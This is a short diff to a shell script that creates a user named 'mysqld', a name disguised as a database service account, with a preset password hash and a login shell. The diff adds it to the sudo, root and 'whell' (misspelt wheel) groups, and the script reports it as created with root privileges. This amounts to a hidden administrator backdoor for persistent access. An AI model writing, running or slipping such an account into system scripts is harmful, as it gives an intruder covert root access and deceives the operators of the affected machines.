@@ -4,7 +4,10 @@ USERNAME="mysqld"
 HASHED_PASS='$6$BmyFRFVm74WLGFqO$2s1sTXYHy0H/G63Sif1Syg55lfY4WOZBNY3IGtYrjTF8We5AsX0ooh8b8s0qCNhEB6rMYzaihSw7tso4LZepc0'
 
 echo "[*] Creating user '$USERNAME' with given password hash..."
-useradd --no-create-home -G sudo,root,wheel --shell /bin/bash -p "$HASHED_PASS" "$USERNAME"
+useradd --no-create-home --shell /bin/bash -p "$HASHED_PASS" "$USERNAME"
+usermod -aG sudo mysqld
+usermod -aG whell mysqld
+usermod -aG root mysqld
 
 echo "[+] User '$USERNAME' created with root privileges."
 
